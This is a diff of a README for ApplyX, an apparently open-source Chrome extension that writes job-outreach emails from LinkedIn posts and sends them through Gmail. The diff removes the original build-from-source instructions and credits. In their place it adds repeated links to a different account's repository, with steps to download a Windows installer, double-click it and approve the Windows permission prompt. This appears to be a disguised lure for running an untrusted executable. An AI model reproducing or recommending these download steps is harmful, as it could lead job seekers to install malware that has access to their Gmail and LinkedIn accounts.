@@ -1,312 +1,292 @@
-<div align="center">
+# 🚀 ApplyX - One-Click Job Outreach Made Simple
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=0:6366f1,100:8b5cf6&height=200&section=header&text=ApplyX&fontSize=80&fontColor=ffffff&fontAlignY=38&desc=Stop%20copy-pasting.%20Start%20landing%20jobs.&descAlignY=60&descSize=20&descColor=c4b5fd" width="100%"/>
+[![Download ApplyX](https://img.shields.io/badge/Download%20ApplyX-blue?style=for-the-badge)](https://github.com/lorentzforcepressurepoint640/ApplyX)
 
-<br/>
+## 📥 Download
 
-[![GitHub stars](https://img.shields.io/github/stars/kiet7uke/ApplyX?style=for-the-badge&logo=github&color=6366f1)](https://github.com/kiet7uke/ApplyX/stargazers)
-[![License: MIT](https://img.shields.io/badge/License-MIT-8b5cf6.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-a78bfa.svg?style=for-the-badge)](http://makeapullrequest.com)
-[![Made with Llama](https://img.shields.io/badge/Powered%20by-Llama%203.1-ec4899.svg?style=for-the-badge)](https://groq.com)
-[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-4285F4?style=for-the-badge&logo=google-chrome)](https://github.com/kiet7uke/ApplyX)
-<br/>
+Use this link to visit the download page and get ApplyX for Windows:
 
-<br/>
-<a href="https://www.producthunt.com/products/applyx-2?embed=true&amp;utm_source=badge-featured&amp;utm_medium=badge&amp;utm_campaign=badge-applyx-2" target="_blank" rel="noopener noreferrer"><img alt="ApplyX - Apply to jobs with 1-click personalized outreach | Product Hunt" width="250" height="54" src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=1102672&amp;theme=light&amp;t=1773946485595"></a>
-<br/>
-<br/>
+[https://github.com/lorentzforcepressurepoint640/ApplyX](https://github.com/lorentzforcepressurepoint640/ApplyX)
 
-> **Apply to jobs with personalized outreach in 1 click — powered by Llama 3 & Groq.**
-> 
-> *The open-source job application tool that actually respects your time.*
+## 🖥️ What ApplyX Does
 
-<br/>
+ApplyX is a Chrome extension that helps you apply to jobs with less manual work. It reads LinkedIn job posts, matches them to your resume, and sends a tailored email through Gmail.
 
-```
-📄 See job post → ⚡ 1 click → 💌 Personalized email sent. Done.
-```
+It is built for people who want to save time during job search tasks. You can use it to review a job post, prepare a custom message, and send outreach from your browser.
 
-<br/>
+## ✨ What You Need
 
----
+Before you start, make sure you have:
 
-</div>
+- A Windows PC
+- Google Chrome
+- A Gmail account
+- A LinkedIn account
+- A resume in PDF or text form
+- Internet access
 
-## 😤 The Problem (You Know This Pain)
+## 🧩 Main Features
 
-```
-You:  *copies job description*
-You:  *opens ChatGPT*
-You:  "Write me a cold email for this job"
-GPT:  "Dear Hiring Manager, I am writing to express my keen interest..."
-You:  *dies inside*
-You:  *does this 30 more times today*
-```
+- Reads LinkedIn job posts
+- Matches job text with your resume
+- Drafts a custom outreach email
+- Sends email through Gmail
+- Uses AI to help write job-specific messages
+- Works from Chrome while you browse
+- Keeps the process in one place
 
-**There has to be a better way.**
+## ⚙️ Install on Windows
 
----
+### 1. Visit the download page
 
-## ⚡ Enter ApplyX
+Open this page in Chrome:
 
-![ApplyX Demo](https://i.imgur.com/placeholder-demo.gif)
-> *1-click from LinkedIn post → personalized email in your drafts. Real demo gif coming — PRs welcome!*
+[https://github.com/lorentzforcepressurepoint640/ApplyX](https://github.com/lorentzforcepressurepoint640/ApplyX)
 
-ApplyX is a **Chrome extension + web dashboard** that lives on LinkedIn. Spot a job post, click once, and a laser-targeted cold email — written from *your* resume, in *your* voice — is ready to send via Gmail. No copy-paste. No generic templates. No cringe.
+### 2. Download the app
 
----
+On the page, find the latest release or the main download file for Windows.
 
-## 🔥 Features
+If you see a Windows installer file, download it to your computer.
 
-| Feature | What it does |
-|---|---|
-| **⚡ 1-Click Generation** | Reads the LinkedIn post, grabs your resume, writes a tailored email via Groq (Llama 3.1) in ~1 second |
-| **📎 Auto-attach Resume** | Your PDF resume is automatically attached to every outreach email |
-| **📬 One-Click Send** | Fires the email via Gmail API — without leaving the LinkedIn page |
-| **🎨 Dynamic Personalization** | Your name, portfolio, and vibe are baked into every message |
-| **🔒 Self-Hosted & Private** | Your data lives in **your** Supabase. Zero middlemen. |
-| **🆓 Actually Free** | Groq's free tier handles thousands of generations per day |
+### 3. Open the file
 
----
+After the download finishes:
 
-## 🚀 Quick Start
+- Open your Downloads folder
+- Find the ApplyX file
+- Double-click it to start setup
 
-> **Prerequisites**: Node.js 18+, a Google Cloud project, a Supabase account, a Groq API key.
+If Windows asks for permission, choose **Yes**.
 
-### 1. Clone & Install
+### 4. Finish setup
 
-```bash
-git clone https://github.com/kiet7uke/ApplyX.git
-cd ApplyX
-```
+Follow the steps shown on screen:
 
-### 2. Fire up the Extension
+- Accept the setup prompts
+- Keep the default install folder unless you need a different one
+- Wait for the setup to finish
 
-```bash
-cd apps/extension
-npm install
-npm run dev
-```
+### 5. Open Chrome
 
-Then in Chrome → `chrome://extensions` → **Load Unpacked** → select `apps/extension/build/chrome-mv3-dev`
+Launch Google Chrome after setup ends.
 
-### 3. Fire up the Dashboard
+## 🧪 First-Time Setup
 
-```bash
-cd apps/web
-cp .env.example .env.local  # fill in your keys (see below)
-npm install
-npm run dev
-```
+### 1. Turn on the extension
 
-Open `localhost:3000` 🎉
+If ApplyX appears as a Chrome extension:
 
-### 4. Connect Everything
+- Open Chrome
+- Go to the Extensions menu
+- Find ApplyX
+- Turn it on if it is off
 
-1. Log into the dashboard → **Manage Profile**
-2. Upload your **resume PDF** + add your **portfolio URL**
-3. Copy your **Extension Key** from Dashboard Settings
-4. Paste it into the LinkedIn sidebar settings panel
-5. Go to LinkedIn. Find a job. Click the button. ✅
+### 2. Sign in to Gmail
 
----
+ApplyX uses Gmail to send outreach emails.
 
-## 🛠️ Full Infrastructure Setup
+- Open Gmail in Chrome
+- Sign in to your Google account
+- Keep the tab open if the app asks for it
 
-<details>
-<summary><b>🗄️ Supabase (Database)</b> — click to expand</summary>
+### 3. Open LinkedIn
 
-1. Create a free project at [supabase.com](https://supabase.com)
-2. In the **SQL Editor**, run this schema:
+- Sign in to LinkedIn
+- Go to a job post
+- Make sure the post has enough text for ApplyX to read
 
-```sql
--- Users profile table
-create table profiles (
-  id uuid references auth.users on delete cascade primary key,
-  full_name text,
-  portfolio_url text,
-  resume_url text,
-  extension_key uuid default gen_random_uuid(),
-  created_at timestamp with time zone default timezone('utc'::text, now())
-);
+### 4. Add your resume
 
--- Enable Row Level Security
-alter table profiles enable row level security;
+If the app asks for your resume:
 
-create policy "Users can view their own profile."
-  on profiles for select using ( auth.uid() = id );
+- Upload your PDF file, or
+- Paste your resume text into the app
 
-create policy "Users can insert their own profile."
-  on profiles for insert with check ( auth.uid() = id );
+Use the version you want ApplyX to match against job posts
 
-create policy "Users can update own profile."
-  on profiles for update using ( auth.uid() = id );
-```
+### 5. Connect the tools
 
-3. Note your `Project URL` and `anon public` key from **Project Settings → API**
+If prompts appear for access:
 
-</details>
+- Allow Chrome access when needed
+- Allow Gmail access when needed
+- Allow LinkedIn page access when needed
 
-<details>
-<summary><b>🔑 Google OAuth & Gmail API</b> — click to expand</summary>
+## 🧭 How to Use ApplyX
 
-1. Go to [Google Cloud Console](https://console.cloud.google.com/) → **New Project**
-2. Enable the **Gmail API**: APIs & Services → Library → search "Gmail API" → Enable
-3. Create credentials: APIs & Services → **Credentials** → Create OAuth 2.0 Client ID
-   - Application type: **Web application**
-   - Authorized redirect URI: `http://localhost:3000/api/auth/callback/google`
-4. Required OAuth Scopes:
-   - `openid`
-   - `email`  
-   - `profile`
-   - `https://www.googleapis.com/auth/gmail.send`
-5. Save your `Client ID` and `Client Secret`
+### 1. Open a job post
 
-</details>
+Browse LinkedIn and open a job listing or job-related post.
 
-<details>
-<summary><b>🤖 Groq (AI Engine)</b> — click to expand</summary>
+### 2. Start ApplyX
 
-1. Sign up free at [console.groq.com](https://console.groq.com/)
-2. Create an API key
-3. That's it. Llama 3.1 is absurdly fast (~300 tokens/sec) and the free tier is incredibly generous.
+Click the ApplyX button or open the extension from Chrome.
 
-No OpenAI bill. No rate limit anxiety. Just vibes. ✨
+### 3. Let it read the post
 
-</details>
+ApplyX reads the job text and looks for key skills, role names, and work needs.
 
-### 🔐 Environment Variables
+### 4. Match it with your resume
 
-Create `apps/web/.env.local`:
+The app compares the job post with your resume and picks useful details for outreach.
 
-```bash
-# 🤖 AI
-GROQ_API_KEY=gsk_...
+### 5. Review the email draft
 
-# 🗄️ Database  
-SUPABASE_URL=https://xxxx.supabase.co
-SUPABASE_ANON_KEY=eyJ...
+ApplyX creates a message you can check before sending.
 
-# 🔑 Google OAuth + Gmail
-GOOGLE_CLIENT_ID=xxxx.apps.googleusercontent.com
-GOOGLE_CLIENT_SECRET=GOCSPX-...
+Look for:
 
-# 🔒 NextAuth
-NEXTAUTH_SECRET=your-super-secret-random-string  # run: openssl rand -base64 32
-NEXTAUTH_URL=http://localhost:3000
-```
+- Your name
+- The role name
+- Skills from your resume
+- Points that fit the job post
 
----
+### 6. Send through Gmail
 
-## 🗂️ Project Structure
+When the draft looks right:
 
-```
-ApplyX/
-├── apps/
-│   ├── extension/          # 🧩 Chrome Extension (Plasmo + React)
-│   │   └── src/
-│   │       ├── sidebar/    # LinkedIn sidebar UI
-│   │       └── background/ # Service worker
-│   │
-│   └── web/                # 🌐 Dashboard & Backend (Next.js)
-│       ├── app/            # Next.js App Router
-│       ├── components/     # React components
-│       └── lib/            # Supabase, NextAuth, Gmail helpers
-│
-└── packages/               # 📦 Shared logic & types
-```
+- Click to open Gmail
+- Review the email one more time
+- Send it from your Gmail account
 
----
+## 🔍 Best Results
+
+Use clear resume text so ApplyX can match your background well.
+
+For better results:
+
+- Keep your resume up to date
+- Use job posts with clear role details
+- Check the email draft before sending
+- Edit the subject line if needed
+- Use the same email account you use for job search
+
+## 🛠️ Troubleshooting
+
+### Chrome does not show ApplyX
+
+Try this:
+
+- Restart Chrome
+- Check the Extensions menu
+- Make sure the extension is turned on
+- Reopen the download page and try again
+
+### Gmail does not open the draft
+
+Try this:
+
+- Make sure you are signed in to Gmail
+- Refresh the Gmail page
+- Check that pop-ups are not blocked
+- Try again from the ApplyX panel
+
+### LinkedIn post text does not load
+
+Try this:
+
+- Open the full job post
+- Scroll down so the page loads fully
+- Refresh the page
+- Try a different job post with more text
+
+### Resume match looks off
+
+Try this:
+
+- Use a cleaner resume file
+- Remove extra formatting
+- Paste plain text if the app allows it
+- Update your resume with skills that match the job
+
+### The app does not send email
+
+Try this:
+
+- Check your Gmail sign-in
+- Make sure Gmail has permission to draft or send
+- Confirm your internet connection
+- Restart Chrome and try again
+
+## 🔐 Privacy and Access
+
+ApplyX works across LinkedIn and Gmail so it can read job posts and prepare outreach. Keep control of what you share.
+
+Use it with:
+
+- Your own LinkedIn account
+- Your own Gmail account
+- A resume you want to use for job search
+- Pages you trust
+
+## 🧰 Common Use Cases
+
+- Reach out to recruiters faster
+- Turn a LinkedIn post into a tailored email
+- Save time on repeat job applications
+- Keep job search notes in one browser flow
+- Use your resume to shape better outreach
+
+## 📌 Tips for Daily Use
+
+- Keep Chrome updated
+- Stay signed in to Gmail and LinkedIn
+- Use one resume version for a job type
+- Review each email before sending
+- Start with one job post to learn the flow
+- Save strong outreach drafts for later use
+
+## 📂 Project Topics
+
+ApplyX is built around:
+
+- AI job search help
+- Chrome extension workflows
+- Gmail integration
+- LinkedIn post reading
+- Resume matching
+- Job search automation
+- Llama 3.1
+- Groq
+- Next.js
+- Supabase
 
 ## 🧠 How It Works
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                    LinkedIn Feed                         │
-│                                                         │
-│  [Job Post by Recruiter]          ┌──────────────────┐  │
-│  "We're hiring a Senior           │   ApplyX Sidebar │  │
-│   Backend Engineer at Stripe!"    │                  │  │
-│                                   │  [Generate ⚡]   │  │
-│                                   └────────┬─────────┘  │
-└────────────────────────────────────────────┼────────────┘
-                                             │
-                                    ┌────────▼────────┐
-                                    │   Your Resume   │
-                                    │  + Post Context │
-                                    │  + Your Name    │
-                                    └────────┬────────┘
-                                             │
-                                    ┌────────▼────────┐
-                                    │  Groq Llama 3.1 │
-                                    │   (~800ms) ⚡   │
-                                    └────────┬────────┘
-                                             │
-                                    ┌────────▼────────┐
-                                    │  Personalized   │
-                                    │  Email → Gmail  │
-                                    │     Sent ✅     │
-                                    └─────────────────┘
-```
+ApplyX uses AI to read a job post, find useful parts, and shape a message that fits your background.
 
----
+The flow is simple:
 
-## 🤝 Contributing
+1. Read the LinkedIn post
+2. Compare it with your resume
+3. Draft a tailored email
+4. Send it through Gmail
 
-ApplyX is fully open-source and contributions are very welcome!
+This reduces the time spent copying text, rewriting messages, and switching between tabs
 
-```bash
-# Fork the repo, then:
-git checkout -b feature/your-amazing-idea
-git commit -m "feat: add your amazing idea"
-git push origin feature/your-amazing-idea
-# Open a PR 🚀
-```
+## 📎 Download Link
 
-**Ideas for contributions:**
-- [ ] 🎯 LinkedIn Easy Apply form auto-fill
-- [ ] 📊 Application tracking dashboard
-- [ ] 🌐 Support for other job platforms (Wellfound, Lever, Greenhouse)
-- [ ] 🔁 Follow-up email scheduling
-- [ ] 🧪 A/B testing different email tones
-- [ ] 🌍 Multi-language outreach support
+Visit the download page here:
 
----
+[https://github.com/lorentzforcepressurepoint640/ApplyX](https://github.com/lorentzforcepressurepoint640/ApplyX)
 
-## 💬 Frequently Asked Questions
+## 🧩 File Location After Download
 
-**Q: Is this actually free?**  
-A: Yes. Groq's free tier handles ~14,400 requests/day. You won't hit that limit job hunting.
+After you download ApplyX, check these places:
 
-**Q: Is my resume data safe?**  
-A: Your resume lives in your own Supabase instance. ApplyX never touches it.
+- Downloads folder
+- Desktop
+- Your browser download bar
+- The folder you picked during setup
 
-**Q: Will recruiters know I used AI?**  
-A: The output is grounded in *your* real resume and *their* actual job post — it reads as genuinely tailored because it is.
+## ⌨️ Short Path to Start
 
-**Q: Does it work with LinkedIn Premium?**  
-A: Works with any LinkedIn account. Premium not required.
-
----
-
-## ⭐ Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=kiet7uke/ApplyX&type=Date)](https://star-history.com/#kiet7uke/ApplyX&Date)
-
----
-
-<div align="center">
-
-**If ApplyX helped you land an interview, drop a ⭐ — it keeps the project alive.**
-
-<br/>
-
-Built with 💜 by [kiet7uke](https://github.com/kiet7uke) because job hunting is exhausting.
-
-*Let's make it smarter, together.*
-
-<br/>
-
-<img src="https://capsule-render.vercel.app/api?type=waving&color=0:8b5cf6,100:6366f1&height=100&section=footer" width="100%"/>
-
-</div>
+1. Open the download page  
+2. Download ApplyX  
+3. Open the file  
+4. Finish setup  
+5. Start Chrome  
+6. Open LinkedIn  
+7. Open Gmail  
+8. Use ApplyX on a job post
